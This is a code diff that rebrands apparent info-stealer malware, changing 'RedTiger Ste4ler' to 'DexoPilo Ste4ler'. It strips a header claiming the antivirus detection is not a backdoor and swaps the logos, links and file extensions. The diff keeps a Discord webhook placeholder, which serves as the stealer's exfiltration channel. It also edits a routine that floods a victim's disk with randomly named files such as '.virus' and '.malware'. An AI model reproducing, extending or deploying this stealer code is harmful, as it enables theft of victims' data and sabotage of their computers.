@@ -1,14 +1,3 @@
-# Copyright (c) DexoPilo
-# See the file 'LICENSE' for copying permission
-# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
-# EN: 
-#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
-#     - Do not resell this tool, do not credit it to yours.
-#    ╔════════════════════════════════════════════════════════════════════════════╗
-#    ║ ! File detected by the antivirus, but be aware that there is no backdoor ! ║
-#    ╚════════════════════════════════════════════════════════════════════════════╝
-
-
 Obligatory = r'''
 import sys
 import os
@@ -46,11 +35,10 @@ def Clear():
         pass
 
 w3bh00k_ur1 = "%WEBHOOK_URL%"
-website = "redtiger.shop"
 color_embed = 0xFFFF99
-username_embed = 'RedTiger Ste4ler'
-avatar_embed = 'https://cdn.discordapp.com/attachments/1268900329605300234/1276010081665683497/RedTiger-Logo.png?ex=66cf38be&is=66cde73e&hm=696c53b4791044ca0495d87f92e6d603e8383315d2ebdd385aaccfc6dbf6aa77&'
-footer_text = "RedTiger Ste4ler | https://github.com/loxyteck/RedTiger-Tools"
+username_embed = 'DexoPilo Ste4ler'
+avatar_embed = 'https://cdn.discordapp.com/attachments/1268900329605300234/1276010081665683497/DexoPilo-Logo.png?ex=66cf38be&is=66cde73e&hm=696c53b4791044ca0495d87f92e6d603e8383315d2ebdd385aaccfc6dbf6aa77&'
+footer_text = "DexoPilo Ste4ler | https://github.com/DeXoSuu/DexoPilo-Tools"
 footer_embed = {
         "text": footer_text,
         "icon_url": avatar_embed,
@@ -1439,7 +1427,7 @@ def Sp4m_Cr34t_Fil3():
            ".js", ".php", ".html", ".css", ".mp3", ".mp4", 
            ".mov", ".jpg", ".pdf", ".troll", ".cooked",
            ".lol", ".funny", ".virus", ".malware"
-           ".redtiger", ".redtiger", ".redtiger", ".redtiger"
+           ".DexoPilo", ".DexoPilo", ".DexoPilo", ".DexoPilo"
     ]
     def Cr43t():
         file_name = "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(10, 50))) + random.choice(ext)
